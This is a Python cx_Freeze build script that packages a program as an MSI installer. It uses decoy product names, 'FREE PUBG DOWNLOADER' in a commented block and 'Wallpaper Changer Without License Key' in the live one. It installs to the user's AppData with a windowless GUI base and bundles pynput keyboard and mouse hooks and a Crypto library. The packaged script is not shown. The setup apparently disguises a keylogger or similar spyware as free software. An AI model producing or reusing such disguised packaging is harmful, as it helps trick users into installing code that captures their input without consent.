"""from cx_Freeze import setup, Executable
buildOptions = dict(packages = [], excludes = [])

import sys
base = None

executables = [
    Executable('test_client.py',  
    base=base,
    icon = "download.ico" ) 
              ]

setup(
    name='HelloWorld',
    version = '1.2.2.3.4',
    description = 'FREE PUBG DOWNLOADER',
    options = dict(build_exe = buildOptions),
    executables = executables
    )
"""
import os
import time
import sys
from cx_Freeze import setup, Executable

company_name = "w0nzy"
product_name = "WallPaper Changer"
publisher = "wonzy"
target_dir = os.path.join(os.path.expanduser("~"),"AppData","Local","HelloWallpaper")
bdist_msi_options = {
    "upgrade_code": "{48B079F4-B598-438D-A62A-8A233A3F8901}",
    "add_to_path": False,
    "summary_data":{
        "author":"w0nzy",
        "comments":"Wallpaper Changer Without License Key",
        "keywords":"Keywords"
    },
    "install_icon":".\download.ico",
    "initial_target_dir": r"%s\%s\%s" % (target_dir,company_name, product_name),
}

build_exe_options = {
"includes": ["Crypto", "pynput","pynput.keyboard","pynput.keyboard._win32","pynput.mouse","pynput.mouse._win32"],
}

# GUI applications require a different base on Windows
base = None
if sys.platform == "win32":
    base = "Win32GUI"

exe = Executable(script="py_py.py",
copyright="Quasi CopyRight %s " % (time.strftime("%Y")),
icon=".\download.ico",
trademarks="Quasi",
uac_admin=False,
shortcut_name="HelloWallpaper",
base=base,
)

setup(name=product_name,
version="1.0.0",

description="HelloWallpaper",
executables=[exe],
options={"bdist_msi": bdist_msi_options,
"build_exe": build_exe_options})